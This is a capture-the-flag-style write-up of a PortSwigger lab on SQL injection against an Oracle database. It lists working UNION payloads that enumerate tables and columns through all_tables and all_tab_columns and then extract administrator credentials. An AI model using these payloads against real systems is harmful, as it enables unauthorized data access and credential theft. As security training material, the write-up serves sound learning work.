# PortSwigger Lab Writeup: SQL Injection - Listing Database Contents on Oracle

## Objective
The objective of this laboratory exercise is to exploit an SQL injection vulnerability to map the database structure of an Oracle database. The goal is to query Oracle-specific system tables to locate the users table, identify its columns, and extract the administrator's credentials.

* **Lab URL**: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
* **Category**: SQL Injection
* **Difficulty**: Practitioner

## Payloads Utilized
* **Payload 1 (Table Enumeration):**
  `Gifts'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
* **Payload 2 (Column Enumeration):**
  `Gifts'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
* **Payload 3 (Data Extraction):**
  `Gifts'+UNION+SELECT+USERNAME_ABCDEF,PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`

*(Note: 'ABCDEF' represents the randomized string appended to table and column names. Oracle generally treats object names as uppercase).*

## Exploitation Methodology

### Step 1: Application Observation
* The application features a vulnerable category filter and utilizes an Oracle backend. Oracle does not utilize the standard `information_schema`.

### Step 2: Payload Injection - Table Enumeration
* Oracle utilizes system views such as `all_tables`. Inject Payload 1: `Gifts'+UNION+SELECT+table_name,NULL+FROM+all_tables--`.
* Search the response for a table name resembling users (e.g., `USERS_XYZ123`).

### Step 3: Payload Injection - Column Enumeration
* Oracle utilizes `all_tab_columns` for column metadata. Inject Payload 2: `Gifts'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XYZ123'--`. Ensure the table name string is uppercase.
* Identify the username and password columns from the response (e.g., `USERNAME_ABC`, `PASSWORD_DEF`).

### Step 4: Payload Injection - Data Extraction
* Construct the final extraction query. Inject Payload 3: `Gifts'+UNION+SELECT+USERNAME_ABC,PASSWORD_DEF+FROM+USERS_XYZ123--`.
* Retrieve the administrator password from the output and log in to resolve the laboratory.

## Conclusion
* This laboratory emphasizes the necessity of understanding Oracle-specific metadata structures (`all_tables`, `all_tab_columns`) for effective database enumeration and exploitation during an SQL injection assessment.